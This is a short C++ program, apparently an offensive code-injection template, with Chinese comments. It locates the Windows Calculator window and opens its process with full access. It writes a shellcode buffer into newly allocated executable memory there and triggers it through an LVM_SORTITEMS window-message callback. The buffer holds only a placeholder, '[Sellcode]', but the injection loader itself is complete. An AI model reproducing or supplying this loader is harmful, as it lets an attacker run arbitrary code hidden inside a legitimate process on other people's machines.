#include <windows.h>
#include <commctrl.h>
#include <iostream>
#pragma comment (lib, "user32.lib")

unsigned char buf[] =
"[Sellcode]";

int main(int argc, char* argv[]) {
  HANDLE ph;
  DWORD pid;
  LPVOID mem;

  //查找计算器窗口
  HWND wpw = FindWindow(NULL, (LPCSTR)"Calculator");
  HWND hw = FindWindowEx(wpw, 0, (LPCSTR)"CalcFrame", 0);

  //获取进程PID并打开进程
  GetWindowThreadProcessId(hw, &pid);
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

  //分配RWX内存
  mem = VirtualAllocEx(ph, NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

  WriteProcessMemory(ph, mem, buf, sizeof(buf), NULL);

  //触发Shellcode执行
  PostMessage(hw, LVM_SORTITEMS, 0, (LPARAM)mem);

  VirtualFreeEx(ph, mem, 0, MEM_DECOMMIT | MEM_RELEASE);
  CloseHandle(ph);
  return 0;
}
